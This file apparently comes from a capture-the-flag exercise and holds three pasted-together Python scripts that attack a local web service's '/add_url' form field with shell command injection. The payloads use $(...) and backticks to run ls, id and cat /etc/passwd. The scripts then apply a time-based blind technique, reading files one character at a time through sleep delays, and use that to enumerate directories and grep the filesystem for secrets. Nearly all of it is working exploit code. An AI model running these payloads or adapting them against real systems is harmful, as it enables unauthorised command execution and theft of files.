import requests
import time

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("="*60)
print("TESTING COMMAND OUTPUT REFLECTION")
print("="*60)

# The vulnerability allows command execution via $(cmd) and `cmd`
# Let's see if we can inject a valid URL that contains command output

# Try to create a URL that would be valid but contains command output
test_payloads = [
    # If the URL is used with curl/wget, maybe command output becomes part of URL
    ("http://$(ls).com", "Domain from ls output"),
    ("http://`hostname`.com", "Domain from hostname"),
    ("http://`id`.com", "Domain from id"),
    
    # Maybe we can use the protocol handler
    ("file://$(ls /etc)", "File protocol"),
    
    # Try to trigger output in error messages
    ("http://$(cat /etc/passwd)", "Passwd in URL"),
    ("http://$(cat /flag.txt 2>/dev/null || echo notfound)", "Flag in URL"),
]

for payload, desc in test_payloads:
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=10)
        content = resp.text
        print(f"\n[{desc}]")
        print(f"  Payload: {payload}")
        print(f"  Response: {content[:300]}")
        
        # Check for any interesting content in response
        if "root:" in content or "flag" in content.lower() or "bin" in content:
            print(f"  [!] POTENTIAL DATA FOUND!")
            
    except Exception as e:
        print(f"\n[{desc}]")
        print(f"  Error: {e}")

import requests
import time

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("="*60)
print("BLIND ENUMERATION - CHARACTER BY CHARACTER")
print("="*60)

# Use time-based comparison to extract data character by character
# Slow but effective for blind injection

def check_char_at(filepath, position, char):
    """Check if character at position matches using time delay"""
    # If char matches, sleep 3 seconds
    payload = f"[ \"$(cat {filepath} 2>/dev/null | cut -c{position}-{position})\" = \"{char}\" ] && sleep 3"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=10)
        elapsed = time.time() - start
        return elapsed > 2.5
    except:
        elapsed = time.time() - start
        return elapsed > 2.5

# Check if file has any content using wc -c
def check_file_exists_and_size(filepath):
    """Check if file exists and has content"""
    payload = f"[ -f {filepath} ] && [ $(cat {filepath} 2>/dev/null | wc -c) -gt 0 ] && sleep 3"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=10)
        elapsed = time.time() - start
        return elapsed > 2.5
    except:
        elapsed = time.time() - start
        return elapsed > 2.5

# Test more file locations
print("[*] Testing common CTF flag locations...")
flag_candidates = [
    "/flag",
    "/flag.txt", 
    "/FLAG",
    "/FLAG.txt",
    "/root/flag",
    "/root/flag.txt",
    "/home/flag",
    "/home/flag.txt",
    "/app/flag",
    "/app/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/var/flag",
    "/var/flag.txt",
    "/etc/flag",
    "flag.txt",  # relative to cwd
    "./flag.txt",
]

found_flags = []

for filepath in flag_candidates:
    print(f"  Testing {filepath}...", end=" ", flush=True)
    if check_file_exists_and_size(filepath):
        print("[FOUND with content!]")
        found_flags.append(filepath)
    else:
        print("[not found or empty]")

print(f"\n[*] Flag files found: {found_flags}")

# If we found a flag file, try to read it character by character
if found_flags:
    for flag_path in found_flags:
        print(f"\n[*] Reading content of {flag_path}...")
        flag_content = ""
        
        # Try reading up to 50 characters
        for position in range(1, 51):
            found_char = None
            # Try common flag characters (alphanumeric, underscores, braces, etc.)
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-:":
                if check_char_at(flag_path, position, char):
                    found_char = char
                    flag_content += char
                    print(f"    Position {position}: {char}")
                    break
            if not found_char:
                print(f"    Position {position}: [end of file or unreadable]")
                break
        
        print(f"\n[*] FLAG CONTENT: {flag_content}")
else:
    print("\n[*] No flag files found in standard locations.")
    print("[*] May need different search strategy...")

import requests
import time

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("="*60)
print("DEEP FILESYSTEM ENUMERATION")
print("="*60)

# First list top-level directories to see what's available
print("\n[*] Listing root directory entries...")

# List directories that might exist and contain flags
locations_to_check = [
    # Standard locations
    "/", "/root", "/home", "/tmp", "/var", "/opt", "/srv",
    "/usr", "/etc", "/lib", "/bin", "/boot", "/dev", "/mnt", "/media",
    # Application locations
    "/app", "/application", "/web", "/www", "/var/www", "/var/www/html",
    "/home/app", "/home/web",
    # CTF specific
    "/challenge", "/ctf", "/pwn", "/task", "/deploy",
]

existing_dirs = []

for location in locations_to_check:
    print(f"  Testing {location}...", end=" ", flush=True)
    # Check if directory exists using time delay
    payload = f"[ -d {location} ] && sleep 2"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=10)
        elapsed = time.time() - start
        if elapsed > 1.5:
            print("[EXISTS]")
            existing_dirs.append(location)
        else:
            print("[no]")
    except:
        elapsed = time.time() - start
        if elapsed > 1.5:
            print("[EXISTS (timeout)]")
            existing_dirs.append(location)
        else:
            print("[error]")

print(f"\n[*] Existing directories: {existing_dirs}")

# Now search within existing directories for files with 'flag' or containing secrets
print("\n[*] Searching in existing directories for flag files...")

for directory in existing_dirs:
    print(f"\n  Searching {directory}...")
    # Find files with flag in name
    payload = f"find {directory} -type f -name '*flag*' 2>/dev/null | head -5 | while read f; do sleep 1; done"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=15)
        elapsed = time.time() - start
        file_count = int(elapsed) if elapsed > 0.5 else 0
        if file_count > 0:
            print(f"    Found {file_count} flag file(s)!")
        else:
            print(f"    No flag files found")
    except Exception as e:
        elapsed = time.time() - start
        if elapsed > 0.5:
            print(f"    Found approx {int(elapsed)} file(s)")

# Also look for files with common flag content patterns
print("\n[*] Searching for files containing flag patterns...")
content_patterns = [
    "FLAG{", "flag{", "FLAG_", "flag_",
    "CTF{", "ctf{", 
    "HSCTF{", "picoCTF{",
]

for pattern in content_patterns:
    print(f"  Searching for '{pattern}'...", end=" ", flush=True)
    payload = f"grep -r '{pattern}' / 2>/dev/null | head -1 | grep -q '{pattern}' && sleep 3"
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=10)
        elapsed = time.time() - start
        if elapsed > 2.5:
            print("[FOUND!]")
        else:
            print("[not found]")
    except:
        elapsed = time.time() - start
        if elapsed > 2.5:
            print("[FOUND! (timeout)]")
        else:
            print("[error]")

